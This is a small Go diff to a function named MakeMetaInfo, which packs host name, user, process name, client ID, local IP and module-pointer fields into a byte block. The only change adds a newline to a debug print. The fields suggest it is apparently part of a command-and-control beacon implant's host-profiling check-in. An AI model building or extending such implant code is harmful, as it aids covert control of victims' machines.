@@ -203,7 +203,7 @@ func MakeMetaInfo() []byte {
 	osInfo := fmt.Sprintf("%s\t%s\t%s", hostName, currentUser, processName)
 	osInfoBytes := []byte(osInfo)
 
-	fmt.Printf("clientID: %d", clientID)
+	fmt.Printf("clientID: %d\n", clientID)
 	onlineInfoBytes := util.BytesCombine(clientIDBytes, processIDBytes, sshPortBytes,
 		flagBytes, majorVerBytes, minorVerBytes, buildBytes, ptrBytes, ptrGMHBytes, ptrGPABytes, localIPBytes, osInfoBytes)
 
